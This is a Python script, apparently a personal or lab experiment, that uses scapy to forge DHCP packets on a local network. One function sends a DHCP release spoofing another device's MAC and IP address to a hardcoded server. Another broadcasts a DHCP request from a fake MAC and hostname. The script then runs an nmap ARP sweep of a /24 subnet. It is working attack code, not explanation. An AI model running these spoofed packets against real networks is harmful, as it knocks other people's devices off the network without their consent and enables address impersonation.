import nmap
import json
import time
import socket
import requests
import netifaces as ni
import subprocess
import fcntl
import threading
from datetime import datetime
import logging
from logging.handlers import TimedRotatingFileHandler
import gzip
import random

import os
import signal
import time

import psutil
#from scapy.all import *
import scapy.all as scapy

def send_dhcp_release(interface):
    my_hw="d8:3a:dd:02:75:f0"
    server_hw="48:8d:36:51:5b:3f"
    my_ip="10.0.0.200"
    server_ip="10.0.0.250"
    release_ip="10.0.0.141"
    release_hw="0e:13:ec:d0:04:84"
    client_id=release_hw
    mac_address = int(client_id.replace(":", ""), 16).to_bytes(6, "big")
    # Craft DHCP release packet
    ether = scapy.Ether(src=release_hw,dst=server_hw)  # Broadcast MAC address
    ip = scapy.IP(src=release_ip, dst=server_ip)  # Broadcast IP address
    udp = scapy.UDP(sport=68, dport=67)  # DHCP ports
    bootp = scapy.BOOTP(chaddr=mac_address, ciaddr=release_ip, xid=random.getrandbits(32))  # DHCP fields
    dhcp = scapy.DHCP(options=[("message-type", "release"), ("client_id", mac_address), ("server_id", server_ip), 'end'])  # DHCP release message

    # Combine all layers
    release_packet = ether / ip / udp / bootp / dhcp

    # Send the packet
    scapy.sendp(release_packet, iface=interface)
    #release_packet.show()

def perform_scan(network):
    nm = nmap.PortScanner()

    try:
        # Record the start time
        start_time = time.time()
        nm.scan(hosts=network, arguments='-sP -PR')
        ip_mac_data = [(x, nm[x]['addresses']['mac']) for x in nm.all_hosts() if 'mac' in nm[x]['addresses']]
        # Record the end time
        end_time = time.time()
        # Calculate the elapsed time
        elapsed_time = end_time - start_time
        return ip_mac_data
    except Exception as e:
        print(f"Error during scan: {e}")
        return None


def send_dhcp_request(interface):
    """
    Send a broadcast DHCP Request with requested IP address and spoofed mac address
    """
    # Obtaining fake host's IP address and Transaction ID
    ip_address = "192.168.138.219"
    fake_ip = "192.168.138.219"
    trans_id = random.getrandbits(32)
    print(random.getrandbits(32))
    fake_hw = "00:00:00:00:00:11"
    hostname = "fake_22"
    client_id="48:b0:2d:c1:6e:d1"
    my_hw="d8:3a:dd:80:f7:0b"
    server_hw="d8:fb:5e:44:4c:bd"
    server_ip="192.168.138.1"
    broadcast_hw="ff:ff:ff:ff:ff:ff"
    mac_address = int(fake_hw.replace(":", ""), 16).to_bytes(6, "big")
    # Converting MAC address from typical format to a 16 bytes sequence, needed for BOOTP/DHCP header
    #mac_address = int(mac_address.replace(":", ""), 16).to_bytes(6, "big")
    # Making DHCP Request packet
    ether_header = scapy.Ether(src=fake_hw, dst=broadcast_hw)
    ip_header = scapy.IP(src="0.0.0.0", dst="255.255.255.255")
    udp_header = scapy.UDP(sport=68, dport=67)
    bootp_field = scapy.BOOTP(chaddr=mac_address, xid=trans_id, flags=0)
    dhcp_field = scapy.DHCP(options=[("message-type", "request"),
                                    ("client_id", b'\x01' + mac_address),
                                    ("server_id", server_ip),
                                    ('param_req_list', [53, 54, 51, 1, 6, 3, 50]),
                                    ("requested_addr", ip_address),
                                    ("hostname", hostname),
                                    "end"])
    dhcp_request = (ether_header/ip_header/udp_header/bootp_field/dhcp_field)

    scapy.sendp(dhcp_request, iface=interface)

# Replace "eth0" with your network interface
send_dhcp_release("eth0")
#send_dhcp_request("eth0")
results = perform_scan("10.0.0.0/24")

print(results)